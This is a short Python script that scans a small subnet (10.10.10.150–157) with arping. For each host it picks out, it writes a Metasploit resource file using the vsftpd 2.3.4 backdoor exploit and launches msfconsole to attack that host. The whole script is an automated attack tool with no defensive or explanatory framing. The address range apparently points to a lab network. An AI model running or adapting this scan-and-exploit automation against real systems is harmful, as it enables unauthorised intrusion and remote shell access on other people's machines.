import os
import threading

def ping(ip):
    ping = os.popen('arping -c 2 '+ip).read()
    if 'index' in ping:ftp(ip)
def ftp(ip):
    rc = open(ip+'.rc','wt')
    rc.write('use exploit/unix/ftp/vsftpd_234_backdoor\n')
    rc.write('set RHOSTS '+ip+'\n')
    rc.write('exploit\n')
    rc.close()
    msf(ip)
def msf(ip):
    os.popen('gnome-terminal -e "bash -c \'msfconsole -r '+ip+'.rc;exec bash\'"')

if __name__ == '__main__':
    for i in range(150,158):
        ip = '10.10.10.'+str(i)
        t1 = threading.Thread(target=ping,args=(ip,))
        t1.start()
